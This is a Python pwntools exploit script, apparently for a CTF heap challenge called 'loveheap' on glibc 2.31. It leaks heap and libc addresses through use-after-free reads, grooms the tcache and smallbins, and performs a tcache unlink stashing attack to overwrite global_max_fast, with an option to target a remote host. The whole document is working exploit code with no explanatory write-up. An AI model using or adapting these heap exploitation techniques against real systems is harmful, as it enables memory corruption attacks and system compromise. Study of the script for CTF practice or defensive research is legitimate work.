#-*- coding=utf-8 -*-
from pwn import *

g_fname = args.FNAME if (args.FNAME) else "./loveheap"
g_elf = ELF(g_fname)
context.binary = g_elf
g_libcname = args.LIB if (args.LIB) else "/lib/x86_64-linux-gnu/libc.so.6"

if (args.LOCAL):
    g_io = process(g_fname)
else:
    rhost, rport = args.REMOTE.split(":")
    g_io = remote(rhost, int(rport))

g_libc = ELF(g_libcname)

def getpid():
    if (args.LOCAL):
        log.info("PID: %d", g_io.proc.pid)
        pause()


s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline


def opt(idx):
    sla(b">>", str(idx).encode())

def add(size):
    opt(1)
    sla(b"size\n", str(size).encode())

def delete(idx):
    opt(2)
    sla(b"idx\n", str(idx).encode())

def show(idx):
    opt(4)
    sla(b"idx\n", str(idx).encode())

def edit(idx, content):
    opt(3)
    sla(b"idx\n", str(idx).encode())
    sa(b"content:\n", content)

def pwn():
    ## libc-2.31
    ## leak heap base and libc base
    # fill tcache[0x80]
    for i in range(7):
        # take slot 0~6
        add(0x80)
        delete(i)
    
    add(0x80) # slot 7, smallbin
    add(0x80) # slot 8, guard1
    
    delete(7)

    # leak heap
    show(6)
    heap_addr = u64(rl()[:-1].ljust(8, b'\0'))
    heap_base = heap_addr - 0x570
    tcache_key = heap_base+0x10
    log.info("heap@%#x\ntcache key=%#x" % (heap_base, tcache_key))

    # leak libc (main_arena)
    show(7)
    arena_addr = u64(rl()[:-1].ljust(8, b'\0'))
    libc_base = arena_addr - 0x1bebe0 # main_arena+96 of 2.31
    addr_mhook = libc_base + g_libc.sym["__malloc_hook"]
    log.info("libc@%#x\n__malloc_hook@%#x" % (libc_base, addr_mhook))

    # fill tcache[0x200] with 6 chunks
    for i in range(6):
        add(0x1f0)  # take slot 9~14
        delete(9+i)
    
    # fill tcache[0x100]
    for i in range(7):
        add(0xf0)
        delete(15+i) # take slot 15~21
    
    add(0xf0)   # slot 22
    add(0xf0)   # slot 23

    add(0xf0)   # slot 24, guard

    add(0xf0)   # s25
    add(0xf0)   # s26

    add(0xf0)   # s27, guard

    # merge into chunk[0x200], insert into unsorted bin 2 smallbin[0x200] chunks.
    delete(22)
    delete(23)

    delete(25)
    delete(26)

    addr_glob_fast_max = libc_base + 0x1c1ec8 # offset of global_max_fast in libc-2.31
    log.info("global_max_fast%#x" % addr_glob_fast_max)

    fd = heap_base + 0x0
    bk = addr_glob_fast_max - 2*8
    edit(25, flat([fd, bk]))

    getpid()
    # tcache unlink stashing
    add(0x1f0)

    getpid()


if ("__main__" == __name__):
    if (args.DEBUG):
        context.log_level = "debug"
    pwn()
    g_io.interactive()
